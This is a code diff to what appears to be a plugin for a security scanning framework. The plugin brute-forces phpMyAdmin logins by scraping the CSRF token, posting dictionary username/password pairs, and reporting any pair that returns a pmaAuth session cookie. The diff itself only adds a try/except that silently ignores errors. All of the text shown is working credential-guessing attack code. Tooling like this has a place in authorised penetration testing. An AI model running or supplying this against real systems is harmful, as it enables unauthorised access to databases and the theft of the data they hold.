@@ -45,19 +45,21 @@ class Script(BaseScript):
                             text1 = await res1.text()
                             if 'input_password' in text1 and 'name="token"' in text1:
                                 async for (username, password) in self.generate_auth_dict(self.username_list, self.password_list):
-                                    async with session.get(url=url, headers=headers) as res2:
-                                        if res2:
-                                            text2 = await res2.text()
-                                            cookies = res2.cookies
-                                            token = re.search('name="token" value="(.*?)" />', text2)
-                                            if token != None:
-                                                token_hash = quote(token.group(1))
-                                                postdata = "pma_username=%s&pma_password=%s&server=1&target=index.php&lang=zh_CN&collation_connection=utf8_general_ci&token=%s" % (
-                                                    username, password, token_hash)
-                                                async with session.post(url=url, data=postdata, headers=headers, cookies=cookies, allow_redirects=False) as res3:
-                                                    if res3 and res3.status == 302:
-                                                        cookies = res3.cookies
-                                                        for key,val in cookies.items():
-                                                            if 'pmaAuth' in key and val != 'deleted':
-                                                                yield username + '/' + password
-                                                                
+                                    try:
+                                        async with session.get(url=url, headers=headers) as res2:
+                                            if res2:
+                                                text2 = await res2.text()
+                                                cookies = res2.cookies
+                                                token = re.search('name="token" value="(.*?)" />', text2)
+                                                if token != None:
+                                                    token_hash = quote(token.group(1))
+                                                    postdata = "pma_username=%s&pma_password=%s&server=1&target=index.php&lang=zh_CN&collation_connection=utf8_general_ci&token=%s" % (
+                                                        username, password, token_hash)
+                                                    async with session.post(url=url, data=postdata, headers=headers, cookies=cookies, allow_redirects=False) as res3:
+                                                        if res3 and res3.status == 302:
+                                                            cookies = res3.cookies
+                                                            for key,val in cookies.items():
+                                                                if 'pmaAuth' in key and val != 'deleted':
+                                                                    yield username + '/' + password
+                                    except:
+                                        pass
